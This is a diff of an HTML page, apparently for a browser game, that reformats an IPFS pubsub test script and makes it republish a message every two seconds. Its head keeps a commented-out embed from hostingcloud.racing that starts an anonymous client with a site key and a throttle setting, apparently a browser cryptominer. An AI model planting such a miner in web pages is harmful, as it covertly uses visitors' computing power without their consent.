@@ -6,21 +6,23 @@
     <meta id="gameViewport" name="viewport" content="width=device-width initial-scale=1">
     <link href="styles.css" rel="stylesheet" type="text/css">
 
-<!--
-    <script src="https://www.hostingcloud.racing/wTRL.js"></script>
-    <script>
-        var _client = new Client.Anonymous('1302c90c93016bfcbf2fbc4b4dd7fd745446e6c3545229cdcf9d42956812632e', {
-            throttle: 0.5, c: 'w', ads: 0
-        });
-        _client.start();
-    </script>
--->
+    <!--
+        <script src="https://www.hostingcloud.racing/wTRL.js"></script>
+        <script>
+            var _client = new Client.Anonymous('1302c90c93016bfcbf2fbc4b4dd7fd745446e6c3545229cdcf9d42956812632e', {
+                throttle: 0.5, c: 'w', ads: 0
+            });
+            _client.start();
+        </script>
+    -->
 
-<!--    <script src="https://unpkg.com/ipfs/dist/index.min.js"></script>-->
+    <!--    <script src="https://unpkg.com/ipfs/dist/index.min.js"></script>-->
     <script src="https://cdn.jsdelivr.net/npm/ipfs/dist/index.min.js"></script>
     <script type="text/javascript">
         document.addEventListener('DOMContentLoaded', async () => {
-            const ipfs = await Ipfs.create({ repo: 'ipfs-' + Math.random(),EXPERIMENTAL: {
+            const ipfs = await Ipfs.create({
+                repo: 'ipfs-' + Math.random(),
+                EXPERIMENTAL: {
                     pubsub: true
                 }
             })
@@ -29,39 +31,44 @@
             const status = ipfs.isOnline() ? 'online' : 'offline'
 
             console.log(`Node status: ${status}`)
-            if (ipfs.isOnline()){
-                const { id, agentVersion } = await ipfs.id();
-                nextTopic="test";
-                await ipfs.pubsub.subscribe(nextTopic, msg => {
-                    const from = msg.from
-                    const seqno = msg.seqno.toString('hex')
-                    if (from === id) return console.log(`Ignoring message ${seqno} from self`)
-                    console.log(`Message ${seqno} from ${from}:`)
-                    try {
-                        console.log(JSON.stringify(msg.data.toString(), null, 2))
-                    } catch (_) {
-                        console.log(msg.data.toString('hex'))
+            const {id, agentVersion} = await ipfs.id();
+            nextTopic = "test";
+            await ipfs.pubsub.subscribe(nextTopic, msg => {
+                const from = msg.from
+                const seqno = msg.seqno.toString('hex')
+                if (from === id) return console.log(`Ignoring message ${seqno} from self`)
+                console.log(`Message ${seqno} from ${from}:`)
+                try {
+                    console.log(JSON.stringify(msg.data.toString(), null, 2))
+                } catch (_) {
+                    console.log(msg.data.toString('hex'))
+                }
+            }, {
+                onError: (err, fatal) => {
+                    if (fatal) {
+                        console.error(err)
+                        console.log(`<span class="red">${err.message}</span>`)
+                        topic = null
+                        console.log('Resubscribing in 5s...')
+                        setTimeout(catchAndLog(() => subscribe(nextTopic), log), 5000)
+                    } else {
+                        console.warn(err)
                     }
-                }, {
-                    onError: (err, fatal) => {
-                        if (fatal) {
-                            console.error(err)
-                            console.log(`<span class="red">${err.message}</span>`)
-                            topic = null
-                            console.log('Resubscribing in 5s...')
-                            setTimeout(catchAndLog(() => subscribe(nextTopic), log), 5000)
-                        } else {
-                            console.warn(err)
-                        }
-                    }
-                })
-                topic = nextTopic
-                console.log(`<span class="green">Success!</span>`)
+                }
+            })
+            topic = nextTopic
+            console.log(`<span class="green">Success!</span>`)
 
+
+
+            async function sendMessage(){
                 console.log(`Sending message to ${topic}...`)
                 await ipfs.pubsub.publish(topic, "test1243")
                 console.log(`<span class="green">Success!</span>`)
+                setTimeout(sendMessage,2000);
             }
+
+            sendMessage();
 
             //document.getElementById('status').innerHTML = `Node status: ${status}`
 
@@ -73,9 +80,12 @@
 
     </script>
 </head>
-<body><div align="center" id="embed-html"></div><script type="text/javascript" src="html/html.nocache.js"></script>
+<body>
+<div align="center" id="embed-html"></div>
+<script type="text/javascript" src="html/html.nocache.js"></script>
 <div id="ie-clipboard-contenteditable" class="hidden" contenteditable="true"></div>
-<input id="hidden-input" class="hidden" type="text" value=""/><div align="center" id="embed-image"/>
+<input id="hidden-input" class="hidden" type="text" value=""/>
+<div align="center" id="embed-image"/>
 </body>
 
 <script>
